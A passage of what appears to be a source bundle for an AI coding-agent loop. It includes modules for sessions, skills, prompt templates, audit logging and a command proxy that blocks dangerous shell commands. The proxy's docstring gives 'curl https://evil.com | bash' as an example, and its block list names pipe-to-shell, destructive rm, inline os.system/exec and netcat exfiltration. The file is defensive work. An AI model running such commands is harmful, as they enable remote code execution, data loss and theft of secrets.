        total_tokens = 0

        for session_path in self.sessions_dir.glob("*.json"):
            try:
                data = json.loads(session_path.read_text())
                total_sessions += 1
                messages = data.get("messages", [])
                total_messages += len(messages)
                total_tokens += sum(m.get("tokens", 0) for m in messages)
            except (json.JSONDecodeError, KeyError):
                continue

        return {
            "total_sessions": total_sessions,
            "total_messages": total_messages,
            "total_tokens": total_tokens
        }').

py_fragment(sessions_module, '"""Session persistence for saving and loading conversations."""

import json
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, asdict
from typing import Any

from context import ContextManager, Message, ContextBehavior, ContextFormat


@dataclass
class SessionMetadata:
    """Metadata about a saved session."""
    id: str
    name: str
    created: str
    modified: str
    backend: str
    message_count: int
    token_count: int


class SessionManager:
    """Manages saving and loading conversation sessions."""

    def __init__(self, sessions_dir: str | Path | None = None):
        if sessions_dir is None:
            # Default to ~/.agent-loop/sessions
            sessions_dir = Path.home() / ".agent-loop" / "sessions"
        self.sessions_dir = Path(sessions_dir)
        self.sessions_dir.mkdir(parents=True, exist_ok=True)

    def save_session(
        self,
        context: ContextManager,
        session_id: str | None = None,
        name: str | None = None,
        backend_name: str = "unknown",
        extra: dict | None = None
    ) -> str:
        """Save a conversation session to disk.

        Returns the session ID.
        """
        # Generate session ID if not provided
        if session_id is None:
            session_id = datetime.now().strftime("%Y%m%d_%H%M%S")

        # Generate name if not provided
        if name is None:
            name = f"Session {session_id}"

        now = datetime.now().isoformat()

        session_data = {
            "metadata": {
                "id": session_id,
                "name": name,
                "created": now,
                "modified": now,
                "backend": backend_name,
                "message_count": context.message_count,
                "token_count": context.token_count,
            },
            "settings": {
                "max_tokens": context.max_tokens,
                "max_messages": context.max_messages,
                "behavior": context.behavior.value,
                "format": context.format.value,
            },
            "messages": [
                {
                    "role": msg.role,
                    "content": msg.content,
                    "tokens": msg.tokens
                }
                for msg in context.messages
            ],
            "extra": extra or {}
        }

        # Save to file
        session_path = self.sessions_dir / f"{session_id}.json"
        session_path.write_text(json.dumps(session_data, indent=2))

        return session_id

    def load_session(self, session_id: str) -> tuple[ContextManager, dict]:
        """Load a conversation session from disk.

        Returns (context_manager, metadata_dict).
        """
        session_path = self.sessions_dir / f"{session_id}.json"

        if not session_path.exists():
            raise FileNotFoundError(f"Session not found: {session_id}")

        data = json.loads(session_path.read_text())

        # Restore settings
        settings = data.get("settings", {})
        behavior = ContextBehavior(settings.get("behavior", "continue"))
        format_ = ContextFormat(settings.get("format", "plain"))

        context = ContextManager(
            max_tokens=settings.get("max_tokens", 100000),
            max_messages=settings.get("max_messages", 50),
            behavior=behavior,
            format=format_
        )

        # Restore messages
        for msg_data in data.get("messages", []):
            context.add_message(
                role=msg_data["role"],
                content=msg_data["content"],
                tokens=msg_data.get("tokens", 0)
            )

        return context, data.get("metadata", {}), data.get("extra", {})

    def list_sessions(self) -> list[SessionMetadata]:
        """List all saved sessions."""
        sessions = []

        for path in sorted(self.sessions_dir.glob("*.json"), reverse=True):
            try:
                data = json.loads(path.read_text())
                meta = data.get("metadata", {})
                sessions.append(SessionMetadata(
                    id=meta.get("id", path.stem),
                    name=meta.get("name", "Unnamed"),
                    created=meta.get("created", ""),
                    modified=meta.get("modified", ""),
                    backend=meta.get("backend", "unknown"),
                    message_count=meta.get("message_count", 0),
                    token_count=meta.get("token_count", 0)
                ))
            except (json.JSONDecodeError, KeyError):
                # Skip invalid session files
                continue

        return sessions

    def delete_session(self, session_id: str) -> bool:
        """Delete a saved session."""
        session_path = self.sessions_dir / f"{session_id}.json"
        if session_path.exists():
            session_path.unlink()
            return True
        return False

    def session_exists(self, session_id: str) -> bool:
        """Check if a session exists."""
        session_path = self.sessions_dir / f"{session_id}.json"
        return session_path.exists()

    def update_session_name(self, session_id: str, new_name: str) -> bool:
        """Update the name of a saved session."""
        session_path = self.sessions_dir / f"{session_id}.json"
        if not session_path.exists():
            return False

        data = json.loads(session_path.read_text())
        data["metadata"]["name"] = new_name
        data["metadata"]["modified"] = datetime.now().isoformat()
        session_path.write_text(json.dumps(data, indent=2))
        return True').

py_fragment(skills_module, '"""Skills and agent.md loader for customizing agent behavior."""

from pathlib import Path
from typing import Any


class SkillsLoader:
    """Loads and combines skills and agent.md files into system prompts."""

    def __init__(self, base_dir: str | Path | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path.cwd()

    def load_agent_md(self, path: str | Path) -> str:
        """Load an agent.md file.

        The agent.md file defines the agent\'s persona, capabilities,
        and default instructions.
        """
        full_path = self._resolve_path(path)

        if not full_path.exists():
            raise FileNotFoundError(f"Agent file not found: {full_path}")

        return full_path.read_text()

    def load_skill(self, path: str | Path) -> str:
        """Load a single skill file.

        Skill files contain specific instructions for a capability
        (e.g., git operations, testing, code review).
        """
        full_path = self._resolve_path(path)

        if not full_path.exists():
            raise FileNotFoundError(f"Skill file not found: {full_path}")

        return full_path.read_text()

    def load_skills(self, paths: list[str | Path]) -> list[str]:
        """Load multiple skill files."""
        skills = []
        for path in paths:
            try:
                skills.append(self.load_skill(path))
            except FileNotFoundError as e:
                print(f"[Warning: {e}]")
        return skills

    def build_system_prompt(
        self,
        base_prompt: str | None = None,
        agent_md: str | Path | None = None,
        skills: list[str | Path] | None = None
    ) -> str:
        """Build a complete system prompt from components.

        Order:
        1. agent.md (defines persona and core instructions)
        2. Skills (specialized capabilities)
        3. Base prompt (additional instructions/overrides)
        """
        parts = []

        # Load agent.md if provided
        if agent_md:
            try:
                content = self.load_agent_md(agent_md)
                parts.append(content)
            except FileNotFoundError as e:
                print(f"[Warning: {e}]")

        # Load skills
        if skills:
            skill_contents = self.load_skills(skills)
            if skill_contents:
                parts.append("\\n## Skills\\n")
                for skill in skill_contents:
                    parts.append(skill)
                    parts.append("")  # Blank line separator

        # Add base prompt
        if base_prompt:
            if parts:
                parts.append("\\n## Additional Instructions\\n")
            parts.append(base_prompt)

        return "\\n".join(parts) if parts else ""

    def _resolve_path(self, path: str | Path) -> Path:
        """Resolve a path relative to base_dir if not absolute."""
        path = Path(path)
        if path.is_absolute():
            return path
        return self.base_dir / path


def create_example_agent_md(path: str | Path):
    """Create an example agent.md file."""
    content = """# Coding Assistant

You are a skilled software engineer with expertise in multiple programming languages.

## Principles

- Write clean, readable, maintainable code
- Follow established conventions and patterns
- Test your changes when possible
- Explain your reasoning

## Communication Style

- Be concise and direct
- Use code examples when helpful
- Ask clarifying questions when requirements are unclear

## Tools

You have access to:
- `bash`: Execute shell commands
- `read`: Read file contents
- `write`: Create or overwrite files
- `edit`: Make targeted edits to files

## Process

1. Understand the request
2. Explore relevant code if needed
3. Plan the approach
4. Implement changes
5. Verify the changes work
"""
    Path(path).write_text(content)


def create_example_skill(path: str | Path, skill_type: str = "git"):
    """Create an example skill file."""
    skills = {
        "git": """## Git Skill

You are proficient with Git version control.

### Commit Guidelines
- Write clear, descriptive commit messages
- Use conventional commit format: type(scope): description
- Keep commits focused and atomic

### Common Operations
- Always check `git status` before committing
- Review diffs before staging changes
- Pull before pushing to avoid conflicts

### Branch Naming
- feature/description for new features
- fix/description for bug fixes
- docs/description for documentation
""",
        "testing": """## Testing Skill

You write thorough tests for code changes.

### Test Types
- Unit tests for individual functions
- Integration tests for component interactions
- End-to-end tests for user workflows

### Best Practices
- Test both happy path and edge cases
- Use descriptive test names
- Keep tests independent and isolated
- Mock external dependencies

### Commands
- Run tests with appropriate test runner
- Check test coverage when available
""",
        "code-review": """## Code Review Skill

You perform thorough code reviews.

### Review Checklist
- [ ] Code is readable and well-structured
- [ ] No obvious bugs or logic errors
- [ ] Error handling is appropriate
- [ ] No security vulnerabilities
- [ ] Tests cover the changes
- [ ] Documentation is updated

### Feedback Style
- Be constructive and specific
- Explain the "why" behind suggestions
- Distinguish between required changes and suggestions
"""
    }

    content = skills.get(skill_type, skills["git"])
    Path(path).write_text(content)').

py_fragment(templates_module, '"""Prompt templates for reusable prompt snippets."""

import json
import re
from pathlib import Path
from dataclasses import dataclass


# Built-in templates
BUILTIN_TEMPLATES = {
    "explain": "Explain the following code in detail:\\n\\n```\\n{code}\\n```",
    "review": "Please review this code for bugs, security issues, and improvements:\\n\\n```\\n{code}\\n```",
    "refactor": "Refactor this code to be cleaner and more maintainable:\\n\\n```\\n{code}\\n```",
    "test": "Write unit tests for this code:\\n\\n```\\n{code}\\n```",
    "doc": "Add documentation comments to this code:\\n\\n```\\n{code}\\n```",
    "fix": "Fix the bug in this code:\\n\\n```\\n{code}\\n```\\n\\nError: {error}",
    "convert": "Convert this {from_lang} code to {to_lang}:\\n\\n```{from_lang}\\n{code}\\n```",
    "summarize": "Summarize the following in {length} sentences:\\n\\n{text}",
    "translate": "Translate the following to {language}:\\n\\n{text}",
    "simplify": "Simplify this explanation for a {audience}:\\n\\n{text}",
    "debug": "Help me debug this issue:\\n\\nCode:\\n```\\n{code}\\n```\\n\\nExpected: {expected}\\nActual: {actual}",
    "optimize": "Optimize this code for {goal}:\\n\\n```\\n{code}\\n```",
    "regex": "Create a regex pattern that matches: {description}",
    "sql": "Write a SQL query to: {description}",
    "bash": "Write a bash command to: {description}",
    "git": "What git commands should I use to: {description}",
}


@dataclass
class Template:
    """A prompt template."""
    name: str
    template: str
    description: str = ""
    variables: list[str] = None

    def __post_init__(self):
        if self.variables is None:
            # Extract variables from template
            self.variables = re.findall(r\'\\{(\\w+)\\}\', self.template)

    def render(self, **kwargs) -> str:
        """Render the template with provided values."""
        result = self.template
        for key, value in kwargs.items():
            result = result.replace(f"{{{key}}}", str(value))
        return result

    def missing_variables(self, **kwargs) -> list[str]:
        """Return list of variables not provided."""
        return [v for v in self.variables if v not in kwargs]


class TemplateManager:
    """Manages prompt templates."""

    def __init__(self, config_path: str | Path | None = None):
        self.templates: dict[str, Template] = {}
        self.config_path = Path(config_path) if config_path else self._default_config_path()

        # Load built-in templates
        for name, tmpl in BUILTIN_TEMPLATES.items():
            self.templates[name] = Template(name=name, template=tmpl)

        # Load user templates
        self._load_user_templates()

    def _default_config_path(self) -> Path:
        return Path.home() / ".agent-loop" / "templates.json"

    def _load_user_templates(self) -> None:
        """Load user-defined templates from config file."""
        if self.config_path.exists():
            try:
                data = json.loads(self.config_path.read_text())
                for name, tmpl_data in data.items():
                    if isinstance(tmpl_data, str):
                        self.templates[name] = Template(name=name, template=tmpl_data)
                    elif isinstance(tmpl_data, dict):
                        self.templates[name] = Template(
                            name=name,
                            template=tmpl_data.get("template", ""),
                            description=tmpl_data.get("description", "")
                        )
            except (json.JSONDecodeError, IOError):
                pass

    def save_templates(self) -> None:
        """Save user templates to config file."""
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        # Only save non-builtin templates
        user_templates = {
            name: {"template": t.template, "description": t.description}
            for name, t in self.templates.items()
            if name not in BUILTIN_TEMPLATES
        }
        self.config_path.write_text(json.dumps(user_templates, indent=2))

    def get(self, name: str) -> Template | None:
        """Get a template by name."""
        return self.templates.get(name)

    def add(self, name: str, template: str, description: str = "") -> None:
        """Add or update a template."""
        self.templates[name] = Template(name=name, template=template, description=description)

    def remove(self, name: str) -> bool:
        """Remove a template. Returns True if removed."""
        if name in self.templates and name not in BUILTIN_TEMPLATES:
            del self.templates[name]
            return True
        return False

    def list_templates(self) -> list[Template]:
        """List all templates."""
        return sorted(self.templates.values(), key=lambda t: t.name)

    def render(self, name: str, **kwargs) -> str | None:
        """Render a template with provided values."""
        template = self.get(name)
        if template is None:
            return None
        return template.render(**kwargs)

    def format_list(self) -> str:
        """Format templates for display."""
        lines = ["Templates:"]

        # Built-in
        lines.append("\\n  Built-in:")
        for name in sorted(BUILTIN_TEMPLATES.keys()):
            t = self.templates[name]
            vars_str = ", ".join(t.variables) if t.variables else "none"
            lines.append(f"    @{name} ({vars_str})")

        # User-defined
        user_templates = [t for t in self.templates.values() if t.name not in BUILTIN_TEMPLATES]
        if user_templates:
            lines.append("\\n  User-defined:")
            for t in sorted(user_templates, key=lambda x: x.name):
                vars_str = ", ".join(t.variables) if t.variables else "none"
                lines.append(f"    @{t.name} ({vars_str})")

        return "\\n".join(lines)

    def parse_template_invocation(self, text: str) -> tuple[str | None, dict]:
        """Parse a template invocation like \'@explain code=...\'

        Returns (template_name, kwargs) or (None, {}) if not a template.
        """
        if not text.startswith(\'@\'):
            return None, {}

        parts = text[1:].split(None, 1)
        if not parts:
            return None, {}

        name = parts[0]
        if name not in self.templates:
            return None, {}

        kwargs = {}
        if len(parts) > 1:
            # Parse key=value pairs or use remaining as first variable
            rest = parts[1]
            template = self.templates[name]

            # Check for key=value format
            kv_pattern = r\'(\\w+)=(?:"([^"]*)"|(\\S+))\'
            matches = re.findall(kv_pattern, rest)

            if matches:
                for key, quoted, unquoted in matches:
                    kwargs[key] = quoted if quoted else unquoted
            elif template.variables:
                # Use rest as the first variable
                kwargs[template.variables[0]] = rest

        return name, kwargs


def create_default_templates_file(path: str | Path | None = None) -> Path:
    """Create a default templates file for user customization."""
    path = Path(path) if path else Path.home() / ".agent-loop" / "templates.json"
    path.parent.mkdir(parents=True, exist_ok=True)

    example = {
        "mytemplate": {
            "template": "Do something with {input}",
            "description": "Example custom template"
        },
        "pr": {
            "template": "Create a pull request description for these changes:\\n\\n{changes}",
            "description": "Generate PR description"
        }
    }

    path.write_text(json.dumps(example, indent=2))
    return path').

py_fragment(security_audit_module, '"""Audit logging for agent loop security events.

Writes JSONL (one JSON object per line) to session-specific log files.
Three verbosity levels:
  - basic:    commands, tool calls, security violations
  - detailed: + file access, API calls, cost tracking
  - forensic: + command output, environment, timing
"""

import json
import os
import time
from pathlib import Path
from typing import Any


class AuditLogger:
    """JSONL audit logger for agent loop sessions."""

    def __init__(self, log_dir: str | None = None, level: str = \'basic\'):
        if log_dir:
            self.log_dir = Path(log_dir)
        else:
            self.log_dir = Path(os.path.expanduser(\'~/.agent-loop/audit\'))
        self.level = level  # basic, detailed, forensic
        self._session_id: str | None = None
        self._log_file: Path | None = None
        self._enabled = level != \'disabled\'

    def start_session(self, session_id: str, user_id: str = \'\',
                      security_profile: str = \'\') -> None:
        """Begin logging for a new session."""
        if not self._enabled:
            return
        self.log_dir.mkdir(parents=True, exist_ok=True)
        self._session_id = session_id
        timestamp = time.strftime(\'%Y%m%d-%H%M%S\')
        self._log_file = self.log_dir / f\'{timestamp}-{session_id}.jsonl\'
        self._write({
            \'event\': \'session_start\',
            \'session_id\': session_id,
            \'user_id\': user_id,
            \'security_profile\': security_profile,
        })

    def end_session(self) -> None:
        """End the current session."""
        if not self._enabled or not self._session_id:
            return
        self._write({\'event\': \'session_end\', \'session_id\': self._session_id})
        self._session_id = None
        self._log_file = None

    # ── Event logging methods ─────────────────────────────────────────────

    def log_command(self, command: str, allowed: bool,
                    reason: str | None = None,
                    output: str | None = None) -> None:
        """Log a bash command execution attempt."""
        if not self._enabled:
            return
        entry: dict[str, Any] = {
            \'event\': \'command\',
            \'command\': command,
            \'allowed\': allowed,
        }
        if reason:
            entry[\'reason\'] = reason
        if output is not None and self.level == \'forensic\':
            # Truncate large outputs
            entry[\'output\'] = output[:4096]
        self._write(entry)

    def log_file_access(self, path: str, operation: str, allowed: bool,
                        reason: str | None = None,
                        bytes_count: int = 0) -> None:
        """Log a file read/write/edit attempt."""
        if not self._enabled:
            return
        if self.level == \'basic\':
            # basic level only logs blocked file access
            if allowed:
                return
        entry: dict[str, Any] = {
            \'event\': \'file_access\',
            \'path\': path,
            \'operation\': operation,
            \'allowed\': allowed,
        }
        if reason:
            entry[\'reason\'] = reason
        if bytes_count and self.level in (\'detailed\', \'forensic\'):
            entry[\'bytes\'] = bytes_count
        self._write(entry)

    def log_tool_call(self, tool_name: str, success: bool,
                      args_summary: str = \'\') -> None:
        """Log a tool call execution."""
        if not self._enabled:
            return
        entry: dict[str, Any] = {
            \'event\': \'tool_call\',
            \'tool\': tool_name,
            \'success\': success,
        }
        if args_summary:
            entry[\'args\'] = args_summary[:512]
        self._write(entry)

    def log_security_violation(self, rule: str, severity: str,
                               details: dict[str, Any] | None = None) -> None:
        """Log a security rule violation."""
        if not self._enabled:
            return
        entry: dict[str, Any] = {
            \'event\': \'security_violation\',
            \'rule\': rule,
            \'severity\': severity,
        }
        if details:
            entry[\'details\'] = details
        self._write(entry)

    def log_api_call(self, backend: str, model: str,
                     tokens: int = 0, cost: float = 0.0) -> None:
        """Log an API call with cost info."""
        if not self._enabled:
            return
        if self.level == \'basic\':
            return
        self._write({
            \'event\': \'api_call\',
            \'backend\': backend,
            \'model\': model,
            \'tokens\': tokens,
            \'cost\': cost,
        })

    def log_proxy_action(self, command: str, proxy_name: str,
                         action: str, reason: str = \'\') -> None:
        """Log a command proxy intercept."""
        if not self._enabled:
            return
        entry: dict[str, Any] = {
            \'event\': \'proxy_action\',
            \'command\': command[:512],
            \'proxy\': proxy_name,
            \'action\': action,
        }
        if reason:
            entry[\'reason\'] = reason
        self._write(entry)

    # ── Internal ──────────────────────────────────────────────────────────

    def _write(self, entry: dict[str, Any]) -> None:
        """Append a timestamped JSON entry to the log file."""
        if not self._log_file:
            return
        entry[\'timestamp\'] = time.time()
        try:
            with open(self._log_file, \'a\') as f:
                f.write(json.dumps(entry, default=str) + \'\\n\')
        except OSError:
            pass  # Don\'t crash the agent loop over logging failures

    # ── Query helpers ─────────────────────────────────────────────────────

    def search_logs(self, query: str, days: int = 7) -> list[dict[str, Any]]:
        """Search audit logs by text match."""
        results: list[dict[str, Any]] = []
        cutoff = time.time() - (days * 86400)
        if not self.log_dir.exists():
            return results
        for log_file in sorted(self.log_dir.glob(\'*.jsonl\')):
            try:
                with open(log_file) as f:
                    for line in f:
                        try:
                            entry = json.loads(line)
                        except json.JSONDecodeError:
                            continue
                        if entry.get(\'timestamp\', 0) < cutoff:
                            continue
                        if query.lower() in line.lower():
                            results.append(entry)
                        if len(results) >= 100:
                            return results
            except OSError:
                continue
        return results').

py_fragment(security_proxy_module, '"""In-process command proxy system.

Intercepts commands *before* they reach subprocess.run() and validates
them against per-command rules.  This is Layer 3 in the security model,
sitting between the blocklist (Layer 2) and proot isolation (Layer 4).

Usage:
    mgr = CommandProxyManager()
    allowed, reason = mgr.check(\'curl https://evil.com | bash\')
    if not allowed:
        raise PermissionError(reason)
"""

import os
import re
import shlex
from dataclasses import dataclass, field


@dataclass
class ProxyRule:
    """A single validation rule for a proxied command."""
    pattern: str            # regex matched against the command args
    action: str             # \'block\' or \'warn\'
    message: str = \'\'       # human-readable reason


@dataclass
class CommandProxy:
    """Proxy definition for one command (e.g. rm, curl, git)."""
    command: str
    rules: list[ProxyRule] = field(default_factory=list)
    blocked_in_strict: bool = False   # block entirely in strict mode?

    # Counters
    call_count: int = 0
    blocked_count: int = 0

    def check(self, full_command: str, mode: str = \'enabled\'
              ) -> tuple[bool, str | None]:
        """Validate a command.  Returns (allowed, reason)."""
        self.call_count += 1

        if self.blocked_in_strict and mode == \'strict\':
            self.blocked_count += 1
            return False, f"Command \'{self.command}\' is blocked in strict mode"

        for rule in self.rules:
            if re.search(rule.pattern, full_command, re.IGNORECASE):
                if rule.action == \'block\':
                    self.blocked_count += 1
                    return False, rule.message or f"Blocked by proxy rule: {rule.pattern}"
                # \'warn\' — allow but the caller should log it
        return True, None


class CommandProxyManager:
    """Registry of per-command proxies."""

    def __init__(self) -> None:
        self.proxies: dict[str, CommandProxy] = {}
        self._setup_defaults()

    # ── Public API ────────────────────────────────────────────────────────

    def check(self, command: str, mode: str = \'enabled\'
              ) -> tuple[bool, str | None]:
        """Check a full shell command line.

        Args:
            command: The raw command string (as typed by the agent).
            mode: \'enabled\' or \'strict\'.

        Returns:
            (allowed, reason).  reason is None when allowed.
        """
        cmd_name = self._extract_command_name(command)
        if not cmd_name:
            return True, None

        proxy = self.proxies.get(cmd_name)
        if proxy is None:
            return True, None

        return proxy.check(command, mode)

    def add_proxy(self, proxy: CommandProxy) -> None:
        """Register or replace a command proxy."""
        self.proxies[proxy.command] = proxy

    # ── Default proxies ───────────────────────────────────────────────────

    def _setup_defaults(self) -> None:
        # rm — block catastrophic deletes
        # Include the expanded $HOME path so tilde expansion doesn\'t
        # bypass the literal ~ rule.  Also block the Termux prefix
        # since on Android the real /usr, /etc are read-only but the
        # Termux prefix (/data/data/com.termux/files/usr) is writable.
        home = os.path.expanduser(\'~\')
        home_escaped = re.escape(home)
        # Detect Termux prefix (parent of $HOME, typically
        # /data/data/com.termux/files)
        termux_prefix = os.environ.get(
            \'PREFIX\', \'/data/data/com.termux/files/usr\')
        termux_base = os.path.dirname(termux_prefix)  # .../files
        termux_base_escaped = re.escape(termux_base)
        self.proxies[\'rm\'] = CommandProxy(\'rm\', rules=[
            ProxyRule(
                r\'-[rf]*\\s+/$\',
                \'block\', "Cannot rm the root filesystem"),
            ProxyRule(
                r\'-[rf]*\\s+/home\\b\',
                \'block\', "Cannot rm /home"),
            ProxyRule(
                r\'-[rf]*\\s+~/?$\',
                \'block\', "Cannot rm home directory"),
            ProxyRule(
                rf\'-[rf]*\\s+{home_escaped}/?$\',
                \'block\', "Cannot rm home directory (expanded path)"),
            ProxyRule(
                rf\'-[rf]*\\s+{termux_base_escaped}/(usr|home)\\b\',
                \'block\', "Cannot rm Termux system directories"),
            ProxyRule(
                r\'-[rf]*\\s+/etc\\b\',
                \'block\', "Cannot rm /etc"),
            ProxyRule(
                r\'-[rf]*\\s+/usr\\b\',
                \'block\', "Cannot rm /usr"),
        ])

        # curl / wget — block pipe-to-shell and dangerous writes
        for cmd in (\'curl\', \'wget\'):
            self.proxies[cmd] = CommandProxy(cmd, rules=[
                ProxyRule(
                    r\'\\|\\s*(ba)?sh\',
                    \'block\', f"Cannot pipe {cmd} output to shell"),
                ProxyRule(
                    r\'\\|\\s*python\',
                    \'block\', f"Cannot pipe {cmd} output to python"),
                ProxyRule(
                    r\'\\|\\s*eval\',
                    \'block\', f"Cannot pipe {cmd} output to eval"),
                ProxyRule(
                    r\'-o\\s+/etc/\',
                    \'block\', f"Cannot write {cmd} output to /etc/"),
            ])

        # python3 — block dangerous inline execution
        for cmd in (\'python\', \'python3\'):
            self.proxies[cmd] = CommandProxy(cmd, rules=[
                ProxyRule(
                    r\'-c\\s.*os\\.system\',
                    \'block\', "Cannot use os.system() in inline python"),
                ProxyRule(
                    r\'-c\\s.*subprocess\',
                    \'block\', "Cannot use subprocess in inline python"),
                ProxyRule(
                    r\'-c\\s.*__import__\\s*\\(\\s*[\\\'"]os\',
                    \'block\', "Cannot import os in inline python"),
                ProxyRule(
                    r\'-c\\s.*eval\\s*\\(\',
                    \'block\', "Cannot use eval() in inline python"),
                ProxyRule(
                    r\'-c\\s.*exec\\s*\\(\',
                    \'block\', "Cannot use exec() in inline python"),
            ])

        # git — warn on write operations, block in strict
        self.proxies[\'git\'] = CommandProxy(\'git\', rules=[
            ProxyRule(r\'\\bpush\\b\', \'warn\', "git push detected"),
            ProxyRule(r\'\\bpull\\b\', \'warn\', "git pull detected"),
            ProxyRule(r\'\\bmerge\\b\', \'warn\', "git merge detected"),
            ProxyRule(r\'\\breset\\s+--hard\', \'block\', "git reset --hard is blocked"),
            ProxyRule(r\'\\bclean\\s+-f\', \'block\', "git clean -f is blocked"),
            ProxyRule(r\'\\bpush\\s+.*--force\', \'block\', "git force push is blocked"),
        ])

        # ssh — block in strict mode entirely, block ProxyCommand always
        self.proxies[\'ssh\'] = CommandProxy(\'ssh\', blocked_in_strict=True, rules=[
            ProxyRule(
                r\'-o\\s*ProxyCommand\',
                \'block\', "SSH ProxyCommand is blocked"),
        ])

        # scp — block in strict mode
        self.proxies[\'scp\'] = CommandProxy(\'scp\', blocked_in_strict=True)

        # nc / netcat — block in strict mode (potential data exfil)
        for cmd in (\'nc\', \'netcat\', \'ncat\'):
            self.proxies[cmd] = CommandProxy(cmd, blocked_in_strict=True)

    # ── Helpers ───────────────────────────────────────────────────────────

    @staticmethod
    def _extract_command_name(command: str) -> str | None:
        """Extract the base command name from a shell command line.

        Handles env prefixes, paths, sudo, etc.
        """
        stripped = command.strip()
        if not stripped:
            return None

        # Skip common prefixes
        prefixes = (\'env \', \'sudo \', \'nice \', \'nohup \', \'time \')
        while True:
            matched = False
            for prefix in prefixes:
                if stripped.lower().startswith(prefix):
                    stripped = stripped[len(prefix):].lstrip()
                    matched = True
                    break
            if not matched:
                break

        # Skip env VAR=val assignments
        while \'=\' in stripped.split()[0] if stripped else False:
            parts = stripped.split(None, 1)
            if len(parts) < 2:
                return None
            stripped = parts[1]

        # Get first token and extract basename
        try:
            first = shlex.split(stripped)[0]
        except ValueError:
            first = stripped.split()[0] if stripped.split() else \'\'

        # /usr/bin/python3 -> python3
        if \'/\' in first:
            first = first.rsplit(\'/\', 1)[-1]

        return first or None').

py_fragment(security_path_proxy_module, '"""PATH-based command proxy layer.

Generates wrapper scripts in ~/.agent-loop/bin/ that shadow dangerous
commands.  When enabled, these scripts are prepended to PATH so that
even if the in-process proxy misses something (e.g. inside a piped
command or shell script), the wrapper catches it at exec time.

This is Layer 3.5 in the security model — between the in-process
proxy (Layer 3) and proot isolation (Layer 4).
"""

import os
import stat
from pathlib import Path
from dataclasses import dataclass, field

from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from .proxy import CommandProxyManager, CommandProxy


class PathProxyManager:
    """Manages wrapper scripts in ~/.agent-loop/bin/."""

    DEFAULT_BIN_DIR = os.path.expanduser(\'~/.agent-loop/bin\')

    def __init__(self, bin_dir: str | None = None):
        self.bin_dir = Path(bin_dir or self.DEFAULT_BIN_DIR)
        self._generated: set[str] = set()

    def generate_wrappers(self, proxy_mgr: \'CommandProxyManager\') -> list[str]:
        """Auto-generate wrapper scripts from CommandProxyManager rules.

        Returns list of command names for which wrappers were created.
        """
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        generated = []

        for cmd_name, proxy in proxy_mgr.proxies.items():
            script = self._build_wrapper(cmd_name, proxy)
            path = self.bin_dir / cmd_name
            path.write_text(script)
            path.chmod(stat.S_IRWXU)  # 0o700
            generated.append(cmd_name)
            self._generated.add(cmd_name)

        return generated

    def build_env(self, base_env: dict[str, str] | None = None,
                  proxy_mode: str = \'enabled\',
                  audit_log: str | None = None) -> dict[str, str]:
        """Build environment dict with our bin dir prepended to PATH.

        Args:
            base_env: Starting environment (default: os.environ copy).
            proxy_mode: \'enabled\' or \'strict\' — passed to wrappers.
            audit_log: Optional path to JSONL audit log for wrapper logging.

        Returns:
            New env dict suitable for subprocess.run(env=...).
        """
        env = dict(base_env or os.environ)
        current_path = env.get(\'PATH\', \'\')
        bin_str = str(self.bin_dir)
        # Don\'t double-prepend
        if not current_path.startswith(bin_str + \':\'):
            env[\'PATH\'] = f\'{bin_str}:{current_path}\'
        env[\'AGENT_LOOP_PROXY_MODE\'] = proxy_mode
        if audit_log:
            env[\'AGENT_LOOP_AUDIT_LOG\'] = audit_log
        return env

    def cleanup(self) -> None:
        """Remove all generated wrapper scripts."""
        for cmd_name in list(self._generated):
            script = self.bin_dir / cmd_name
            if script.exists():
                script.unlink()
            self._generated.discard(cmd_name)

    def status(self) -> dict:
        """Return diagnostic info."""
        wrappers = []
        if self.bin_dir.exists():
            wrappers = sorted(
                f.name for f in self.bin_dir.iterdir()
                if f.is_file() and os.access(f, os.X_OK)
            )
        return {
            \'bin_dir\': str(self.bin_dir),
            \'exists\': self.bin_dir.exists(),
            \'wrappers\': wrappers,
            \'generated\': sorted(self._generated),
        }

    # ── Internal ──────────────────────────────────────────────────────────

    def _build_wrapper(self, cmd_name: str, proxy: \'CommandProxy\') -> str:
        """Build a bash wrapper script for a single command.

        The wrapper:
        1. Finds the REAL binary by searching PATH excluding our bin dir
        2. Checks the full command against block-action rules
        3. If blocked: prints reason to stderr, exits 126
        4. If allowed: exec\'s the real binary with all original args
        """
        # Build rule checks (only \'block\' rules — \'warn\' just logs)
        checks = []
        for rule in proxy.rules:
            if rule.action != \'block\':
                continue
            # Escape single quotes for embedding in bash
            pattern = rule.pattern.replace("\'", "\'\\\\\'\'")
            message = (rule.message or f\'Blocked: {rule.pattern}\').replace("\'", "\'\\\\\'\'")
            checks.append(
                f\'if echo "$FULL_CMD" | grep -qiP -- \\\'{pattern}\\\'; then\\n\'
                f\'  echo "[PATH-Proxy] {message}" >&2\\n\'
                f\'  exit 126\\n\'
                f\'fi\'
            )

        checks_block = \'\\n\'.join(checks) if checks else \': # no block rules\'

        # Strict-mode full block
        strict_block = \'\'
        if proxy.blocked_in_strict:
            strict_block = (
                \'if [ "$AGENT_LOOP_PROXY_MODE" = "strict" ]; then\\n\'
                f\'  echo "[PATH-Proxy] Command \\\'{cmd_name}\\\' is blocked in strict mode" >&2\\n\'
                \'  exit 126\\n\'
                \'fi\'
            )

        # Build script — shebang MUST be at column 0 (first byte of file)
        lines = [
            \'#!/data/data/com.termux/files/usr/bin/bash\',
            f\'# Auto-generated PATH proxy wrapper for: {cmd_name}\',
            \'# DO NOT EDIT — regenerated from CommandProxyManager rules\',
            \'set -euo pipefail\',
            \'\',
            \'SELF_DIR="$(cd "$(dirname "$0")" && pwd)"\',
            f\'FULL_CMD="{cmd_name} $*"\',
            \'\',
            \'# Find the real binary by removing our dir from PATH\',
            \'CLEAN_PATH="$(echo "$PATH" | tr \\\':\\\' \\\'\\\\n\\\' | grep -v "^$SELF_DIR$" | tr \\\'\\\\n\\\' \\\':\\\')"\',
            f\'REAL_BIN="$(PATH="$CLEAN_PATH" command -v {cmd_name} 2>/dev/null || true)"\',
            \'\',
            f\'if [ -z "$REAL_BIN" ]; then\',
            f\'  echo "[PATH-Proxy] Real \\\'{cmd_name}\\\' not found in PATH" >&2\',
            \'  exit 127\',
            \'fi\',
            \'\',
            \'# Strict-mode full block\',
            strict_block,
            \'\',
            \'# Rule checks\',
            checks_block,
            \'\',
            \'# Audit logging (if enabled via env)\',
